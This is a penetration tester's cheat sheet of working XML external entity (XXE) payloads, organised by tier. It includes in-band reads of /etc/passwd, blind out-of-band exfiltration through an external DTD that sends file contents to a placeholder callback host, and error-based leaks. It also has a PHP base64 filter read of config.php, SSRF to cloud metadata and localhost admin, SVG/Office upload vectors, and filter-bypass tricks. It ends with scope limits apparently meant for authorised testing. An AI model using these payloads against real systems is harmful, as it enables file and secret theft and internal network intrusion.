# XXE Payloads

Any XML parser that resolves external entities — SOAP, SAML, SVG, DOCX/XLSX (zip of XML), RSS, `Content-Type: application/xml`, sometimes JSON endpoints that also accept XML. Try flipping content-type to XML even where JSON is expected.

## Tier 1 — Classic file read (in-band)
Response reflects the entity. Read a boring file first.
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>
```
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Tier 2 — Blind OOB via external DTD
No reflection → exfil through a callback. Host `evil.dtd` on your server.
`evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOURID.oast.fun/?d=%file;'>">
%eval;
%exfil;
```
Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://YOURSRV/evil.dtd">%remote;]>
<root>ok</root>
```
A DNS/HTTP hit (even with no data) proves blind XXE.

## Tier 2 — Error-based exfil
When OOB egress is blocked but errors leak. `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
File contents land in the parser's error message.

## Tier 3 — PHP filter wrapper (base64)
Files with XML-breaking chars (`<`, `&`) fail raw reads; base64 them.
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<root>&xxe;</root>
```

## Tier 3 — SSRF via XXE
Point the entity at internal services / cloud metadata.
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
<root>&xxe;</root>
```

## SVG / Office vector
Upload an SVG or docx with the DOCTYPE embedded:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

## Bypass notes
- DTD stripped? Try parameter entities, or UTF-16/UTF-7 encode the payload to slip a naive regex.
- `file://` blocked? Try `netdoc:/`, `jar:`, `php://filter`, `gopher://`.

## Stop when
One non-sensitive file read (`/etc/hostname`) in-band, OR one OOB DNS/HTTP callback for blind. For SSRF-via-XXE, a single metadata directory listing. Do not read `/etc/shadow` or app secrets in bulk — one boring-file read plus the callback log proves the class. Stop.
